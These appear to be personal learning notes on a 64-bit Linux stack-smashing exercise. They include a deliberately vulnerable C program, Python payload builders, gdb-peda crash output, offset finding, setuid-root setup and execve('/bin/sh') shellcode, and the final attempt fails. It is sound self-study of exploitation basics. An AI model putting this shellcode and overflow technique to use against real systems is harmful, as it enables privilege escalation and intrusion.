# buffer-overflows
Starting with the fucking basics, *inspired by **https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/**, given to me by a person who is good at this and nice*
## Classic stack smashing 
In **64-bit**:

*Parameters to functions are passed through registers.*

*Push/pop on the stack are 8-bytes wide.*

*Pointers are 8-bytes wide.*

*Maximum canonical address size is 0x00007FFFFFFFFFFF., **the fuck***
### disabled ASLR, NX, and stack canaries, cuz we're pussies
Compile with:
```
gcc -fno-stack-protector -z execstack
```
**vulnerable source code**
```
#include <stdio.h>
#include <unistd.h>

int vuln() {
    char buf[80];
    int r;
    r = read(0, buf, 400);
    printf("\nRead %d bytes. buf is %s\n", r, buf);
    puts("No shell for you :(");
    return 0;
}

int main(int argc, char *argv[]) {
    printf("Try to exec /bin/sh");
    vuln();
    return 0;
}
```
*vulnerabilty lies in vuln() function **duh**, where **read** is allowed to read up to 400 characters to an 80 byte buffer*

writing the 400 bytes to overflow that shit:
```
#!/usr/bin/env python
buf = ""
buf += "A"*400

f = open("in.txt", "w")
f.write(buf)
```
*nice clean script, nice, create a file in.txt, write 400 'A's then redirect its content to **classic** binary inside gdb, well **gdb-peda**, cuz it's prettier*
```
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```
yay
```
$ gdb ./classic
gdb-peda$ r < in.txt 
Starting program: /home/lala/Desktop/classic < in.txt
Try to exec /bin/sh
Read 400 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
No shell for you :(
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x555555555210 (<__libc_csu_init>: endbr64)
RCX: 0x7ffff7ed71e7 (<__GI___libc_write+23>:    cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x5555555592a0 ("No shell for you :(\nis ", 'A' <repeats 92 times>, "\220\001\n")
RDI: 0x7ffff7fb44c0 --> 0x0 
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffe2c8 ('A' <repeats 200 times>...)
RIP: 0x5555555551da (<vuln+81>: ret)
R8 : 0x14 
R9 : 0x77 ('w')
R10: 0x55555555601d --> 0x656873206f4e000a ('\n')
R11: 0x246 
R12: 0x5555555550a0 (<_start>:  endbr64)
R13: 0x7fffffffe3d0 ('A' <repeats 32 times>, "\224\346\377\377\377\177")
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5555555551cf <vuln+70>:    call   0x555555555070 <puts@plt>
   0x5555555551d4 <vuln+75>:    mov    eax,0x0
   0x5555555551d9 <vuln+80>:    leave  
=> 0x5555555551da <vuln+81>:    ret    
   0x5555555551db <main>:       endbr64 
   0x5555555551df <main+4>:     push   rbp
   0x5555555551e0 <main+5>:     mov    rbp,rsp
   0x5555555551e3 <main+8>:     sub    rsp,0x10
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe2c8 ('A' <repeats 200 times>...)
0008| 0x7fffffffe2d0 ('A' <repeats 200 times>...)
0016| 0x7fffffffe2d8 ('A' <repeats 200 times>...)
0024| 0x7fffffffe2e0 ('A' <repeats 200 times>...)
0032| 0x7fffffffe2e8 ('A' <repeats 200 times>...)
0040| 0x7fffffffe2f0 ('A' <repeats 200 times>...)
0048| 0x7fffffffe2f8 ('A' <repeats 200 times>...)
0056| 0x7fffffffe300 ('A' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00005555555551da in vuln ()
```
**RIP wasnt ovewritten, the fuck**, the *maximum address size is 0x00007FFFFFFFFFFF*, yup, needs to be ovewritten by **0x0000414141414141**, because *0x4141414141414141* raises an exception as it is a non-canonical address, therefore need to find the offset

using **cyclic pattern**
```
gdb-peda$ pattern_create 400 in.txt
Writing pattern of 400 chars to filename "in.txt"
```
run again
```
gdb-peda$ r < in.txt
.
.
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400606 in vuln ()
gdb-peda$ x/wx $rsp
0x7fffffffe478: 0x41413741
```
the cyclic pattern can be seen on the stack, find the offset
```
gdb-peda$ pattern_offset 0x41413741
1094793025 found at offset: 104
```
Updating python exploit to use offset **104**
```
#!/usr/bin/env python
from struct import *

buf = ""
buf += "A"*104                      # offset to RIP
buf += pack("<Q", 0x424242424242)   # overwrite RIP with 0x0000424242424242
buf += "C"*290                      # padding to keep payload length at 400 bytes

f = open("in.txt", "w")
f.write(buf)
```
*pack("<Q", 0x424242424242): **'Q' conversion codes are available in native mode only if the platform C compiler supports C long long***
```
gdb-peda$ r < in.txt
.
.
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000424242424242 in ?? ()
```
*RIP has been controlled **at laaaast***

Now shellcode can be written directly to stack and return to it, **27 byte long shellcode** that executes execve("/bin/sh"), stored on the stack via an env variable, and find its address on the stack
```
$ export PWN=`python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`
```
*finding address using getenvaddr **https://github.com/historypeats/getenvaddr.git***
```
$ ./getenvaddr PWN ./classic
PWN will be at 0x7ffd0fd15ed5
```
in gdb-peda
```
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007ffec4389ed5 in ?? ()
```
*RIP was overwritten by the correct address*
```
$ sudo chown root classic
$ sudo chmod 4755 classic
```
But
```
$ python2.7 e.py
$ (cat in.txt ; cat) | ./classic
Try to exec /bin/sh
Read 400 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
No shell for you :(
whoami
Segmentation fault (core dumped)
```
**wtf, doesn't fucking work, nice, fuck this shit**
